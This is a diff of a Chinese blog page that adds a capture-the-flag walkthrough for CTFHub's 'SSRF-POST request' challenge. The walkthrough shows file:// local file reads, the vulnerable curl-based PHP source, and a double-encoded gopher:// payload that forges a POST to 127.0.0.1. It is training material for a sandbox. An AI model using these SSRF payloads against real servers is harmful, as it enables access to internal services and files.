@@ -58,8 +58,14 @@
 <meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220802103546644.png">
 <meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/.%5CCTFHub-wp%5Cimage-20220802103603770.png">
 <meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220802105640721.png">
+<meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220925221703912.png">
+<meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220925222739689.png">
+<meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220925231951671.png">
+<meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220925232013164.png">
+<meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220925222739689.png">
+<meta property="og:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220925232055769.png">
 <meta property="article:published_time" content="2022-07-27T09:31:30.845Z">
-<meta property="article:modified_time" content="2022-09-21T00:57:22.341Z">
+<meta property="article:modified_time" content="2022-09-25T15:21:49.370Z">
 <meta property="article:author" content="Ttoc">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://try-to-change.github.io/2022/07/27/CTFHub-wp/image-20220919213733369.png">
@@ -248,7 +254,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-09-21 08:57:22" itemprop="dateModified" datetime="2022-09-21T08:57:22+08:00">2022-09-21</time>
+                <time title="修改时间：2022-09-25 23:21:49" itemprop="dateModified" datetime="2022-09-25T23:21:49+08:00">2022-09-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -273,14 +279,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>9.5k</span>
+              <span>12k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
+              <span>11 分钟</span>
             </span>
 
         </div>
@@ -492,7 +498,65 @@
 <p><img src="/2022/07/27/CTFHub-wp/image-20220802105640721.png" alt="image-20220802105640721"></p>
 <p>看到长度不同，打开查看响应数据包</p>
 <p>得到flag</p>
-<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p>麻了</p>
+<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
+<p>开始是一个空白页面</p>
+<p>网站为</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure></div>
+
+<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=127.0.0.1/</span>flag.php</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/07/27/CTFHub-wp/image-20220925221703912.png" alt="image-20220925221703912"></p>
+<p>发现出现了一个输入框</p>
+<p><code>F12</code>查看源码：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>发现了一个<code>key</code>的参数</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>是不定的哈，不要全<span class="built_in">copy</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们把<code>key</code>值输入框中试试</p>
+<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
+<p>看来只能从本地<code>127.0.0.1</code>访问</p>
+<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure></div>
+
+<p>右键查看，</p>
+<p>得到<code>index.php</code>源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>以相同方式看看<code>flag.php</code>文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>根据<code>flag.php</code>最后的提示，</p>
+<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gopher协议的格式:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IP数据流</span><br></pre></td></tr></table></figure></div>
+
+<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> 这个要和底下POST参数[包括<span class="keyword">key</span>=,4个]长度一致</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但是这里需要对其进行两次<code>url</code>编码</p>
+<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>
+<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>
+<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>
+<p>因此需要两次<code>url</code>编码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`注`：</span><br><span class="line">在第一次编码后的数据中，将`%<span class="number">0</span>A`全部替换为`%<span class="number">0</span>D%<span class="number">0</span>A`。</span><br><span class="line"></span><br><span class="line">因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，</span><br><span class="line">避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/07/27/CTFHub-wp/image-20220925231951671.png" alt="image-20220925231951671"></p>
+<p>然后第二次编码</p>
+<p><img src="/2022/07/27/CTFHub-wp/image-20220925232013164.png" alt="image-20220925232013164"></p>
+<p>得到</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure></div>
+
+<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果直接在输入框，上传POST请求又会显示</p>
+<p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p>
+<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/07/27/CTFHub-wp/image-20220925232055769.png" alt="image-20220925232055769"></p>
+<p>得到flag</p>
 
     </div>
 
@@ -680,13 +744,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">141k</span>
+    <span title="站点总字数">144k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:08</span>
+    <span title="站点阅读时长">2:11</span>
 </div>
 
 <script>
